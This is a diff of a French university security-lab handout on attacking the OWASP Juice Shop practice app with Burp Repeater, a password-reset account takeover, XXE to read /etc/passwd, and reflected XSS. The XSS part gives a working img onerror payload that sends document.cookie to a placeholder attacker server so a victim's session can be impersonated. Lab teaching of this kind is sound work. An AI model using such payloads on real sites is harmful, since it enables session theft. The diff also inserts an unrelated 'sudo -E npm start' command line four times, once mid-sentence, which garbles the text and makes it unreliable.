@@ -166,7 +166,7 @@ Pour trouver le score board, vous allez procéder de manière entièrement manue
 
 Désactivez l’utilisation du proxy `Burp Suite` dans `FoxyProxy` et trouvez le lien vers la page du score board. 
 
-Pour ce faire, plusieurs options s'offrent à vous. 
+Pour ce faire, plusieurs options s'offrent àexport NODE_ENV=quiet && export PORT=80 && sudo -E npm start vous. 
 Vous pouvez: 
 - Soit analyser le code source des pages de l'application Web affichées dans le navigateur Web (y compris les fichiers JavaScript) pour trouver le lien
 - Soit deviner le lien vers la page où le score board est caché
@@ -188,7 +188,7 @@ Pour ce faire:
   - Pour ce faire, essayez de vous authentifier avec n'importe quel identifiant
   - La requête qui nous intéresse doit contenir les identifiants saisis
 
-- Lorsque vous avez intercepté cette requête, envoyez-la au `Repeater` avec clique droit `Send to Repeater`
+- Lorsque vous avez intercepté cette requête, envoyez-la au `Repeater` avec clique droit `Send to Repeater`export NODE_ENV=quiet && export PORT=80 && sudo -E npm start
     - `Repeater` vous permettra de modifier la requête pour essayer une entrée différente et de visualiser directement la réponse de l’application Web
     - Allez dans l'onglet `Repeater`
     - Pour envoyer la requête à l'application web, cliquez sur `Send`
@@ -212,7 +212,7 @@ Normalement, l'application devrait être configurée pour ne jamais afficher d'i
 
 ### Insecure Design - Voler l'identité de Jim
 Dans cette partie, vous allez exploiter un mauvais mécanisme de récupération de mot de passe. 
-
+export NODE_ENV=quiet && export PORT=80 && sudo -E npm start
 Vous allez exploiter cette vulnérabilité pour changer le mot de passe de l’utilisateur Jim et voler son identité.
 
 Pour commencer, vous devez d'abord comprendre comment fonctionne le mécanisme de récupération de mot de passe dans l'application Web.
@@ -296,7 +296,7 @@ Vous allez utiliser cette vulnérabilité pour lire le fichier `/etc/passwd` du 
 Un exemple d’exploitation de cette vulnérabilité a été vu pendant le CM. 
 Cet exemple fonctionne également pour le `Juice Shop`.
 Vous pouvez donc récupérer le contenu du fichier XML depuis le CM et l'utiliser pour l'attaque.
-
+export NODE_ENV=quiet && export PORT=80 && sudo -E npm start
 Tout d'abord, vous devez trouver une page avec un formulaire qui vous permet d'uploader des fichiers XML et essayer de l'exploiter.
 - Ne cherchez pas trop loin, cette page est accessible depuis la page d'accueil en étant connecté avec n'importe quel utilisateur
 - **Quelle page contient le formulaire qui vous permet d'uploader des fichers XML ?**
@@ -349,56 +349,65 @@ Lorsque vous avez compris comment fonctionne la récupération du panier, essaye
 ### Cross-Site Scripting (XSS) - Voler des cookies
 Dans cette section, vous allez trouver et exploiter la vulnérabilité de type Reflected XSS. 
 
-Vous allez commencer par rechercher un paramètre présent dans l'URL qui n’effectue aucun filtrage ni nettoyage et qui est inclus directement dans la réponse immédiate de l’application Web.
-Ensuite, vous allez créer une URL spéciale qui volera les cookies d’un utilisateur lorsqu’il la visitera.
+Vous allez commencer par rechercher un paramètre vulnérable répondant aux critères suivants:
+- Présent dans l'URL
+- N'effectue pas un filtrage et un nettoyage suffisants de la valeur
+- Valeur est directement incluse dans la réponse immédiate de l'application Web
+
+Ensuite, vous créerez une URL spéciale contenant un code qui s'exécutera dans le navigateur de la victime lorsqu'elle la visitera.
+Ce code va evoyer les cookies de l'utilisateur à un serveur que vous contrôlez.
 
 Pour trouver la vulnérabilité :
 - Trouvez une page avec un paramètre potentiellement vulnérable
     - Vous devez trouver une page où la valeur d'un paramètre est inclus **dans la réponse immédiate de l'application Web** (dans le contenu de la page HTML)
 - Vérifiez si la valeur de ce paramètre est incluse dans le contenu de la page sans validation ni échappement
-    - Vous pouvez essayer de mettre du code HTML comme valeur (par exemple `<h1>Lyon1</h1>`) et si le contenu HTML est inclus et interprété sur la page, vous avez trouvé une vulnérabilité
-        - Il faudra peut-être encoder le code HTML dans le format URL-encoded afin qu'il puisse être utilisé dans l'URL. Pour ce faire, utilisez un encodeur en ligne comme [https://www.urlencoder.org/](https://www.urlencoder.org/)
+    - Vous pouvez essayer d'utiliser du code HTML comme valeur (par exemple `<h1>Lyon1</h1>`). Si le contenu HTML est inclus et interprété sur la page, vous avez trouvé une vulnérabilité
+        - Si vous insérez directement le code HTML dans l'URL, vous devrez l'encoder au format URL-encoded pour qu'il puisse être utilisé dans l'URL
+        - Pour ce faire, utilisez un encodeur en ligne comme [https://www.urlencoder.org/](https://www.urlencoder.org/)
 - **Quelle page et quel paramètre sont vulnérables ?**
 
 Félicitations, vous avez trouvé un moyen d’injecter du code HTML dans la page via un paramètre vulnérable.
 
 Il faut maintenant trouver un moyen d'injecter du code JavaScript dans la page pour pouvoir voler les cookies de l'utilisateur.
 
-Pour faire cela, vous pouvez utiliser les tags HTML `img` ou `iframe`.
+Pour faire cela, vous pouvez utiliser les tags HTML `img` ou `iframe`:
+- `img` qui tente de charger une image inexistante avec du code JavaScript dans le paramètre `onerror="CODE_JS"`
+- `iframe` avec le code JavaScript dans le paramètre `src="javascript:CODE_JS"`
 
-- `img` qui essaye de charger une image inexistante avec du code JS dans le paramètre `onerror="CODE_JS"`
-- `iframe` avec le code JS dans le paramètre `src="javascript:CODE_JS"`
+- **Quelle valeur de paramètre utilisez-vous pour afficher `Lyon1` sous forme d'alerte JavaScript ?**
 
-- **Que mettez-vous comme valeur de paramètre pour afficher `Lyon1` comme alerte JavaScript ?**
+Ensuite, il faut trouver un moyen de récupérer les cookies de l'utilisateur avec du code JavaScript.
 
-Ensuite, il faut trouver un moyen de récupérer les cookies de l'utilisateur avec du code JavaScript. 
 Les cookies de l’utilisateur se trouvent dans la variable `document.cookie`.
 - Affichez les cookies dans une alerte JS en utilisant la vulnérabilité trouvée précédemment.
-- **Que mettez-vous comme valeur de paramètre pour faire cela ?**
+- **Quelle valeur de paramètre utilisez-vous pour faire cela ?**
 
 Jusqu'à présent, vous avez affiché des cookies en exploitant une vulnérabilité XSS.
 
 Vous allez maintenant voler les cookies d'un utilisateur en exploitant cette vulnérabilité. 
 
 Pour ce faire:
-- Démarrez un serveur HTTP Python sur le port `443` sur la machine OpenStack
+- Démarrez un serveur HTTP Python sur le port `443` sur la VM OpenStack
     - `sudo python3 -m http.server 443`
 
 - Créez une URL avec le parametre vulnérable contenant le tag HTML `img` avec `onerror` suivant
-    - `this.src='http://ADR-DE-LA-MACHINE-OPENSTACK:443/?c='+document.cookie`
+    - `this.src='http://ADRESSE-DE-LA-VM:443/?c='+document.cookie`
 
 - Testez l'URL créée précédemment depuis votre navigateur
-    - Si tout a été fait correctement dans les logs du serveur HTTP, vous allez voir les cookies de votre utilisateur ![Logs du serveur web avec les cookies de l'utilisateur](./images/webserver_log.png)
+    - Si tout a été fait correctement dans les logs du serveur HTTP, vous allez voir les cookies de votre utilisateur
+ 
+![Logs du serveur web avec les cookies de l'utilisateur](./images/webserver_log.png)
 
 - **Avez-vous réussi à exploiter cette vulnérabilité ?**
 - **Quelle URL avez-vous utilisé ?**
 - **Quels champs contiennent les cookies volés ?**
 
-De même, vous pouvez envoyer un lien avec cette URL à la victime. 
+De même, vous pouvez envoyer un lien contenant cette URL à la victime.
 Si la victime ouvre ce lien, les logs du serveur HTTP vont contenir ses cookies.
 Ensuite, il sera possible d'usurper son identité grâce à ses cookies.
 
-L'attaque vue ci-dessus est relativement compliquée à réaliser car la victime doit utiliser le lien fourni par l'attaquant. 
+L'attaque vue ci-dessus est relativement compliquée à réaliser car la victime doit utiliser le lien fourni par l'attaquant.
+
 Par conséquent, les attaques Reflected XSS et DOM XSS dans la plupart des cas ne sont pas considérées comme critiques.
 
 
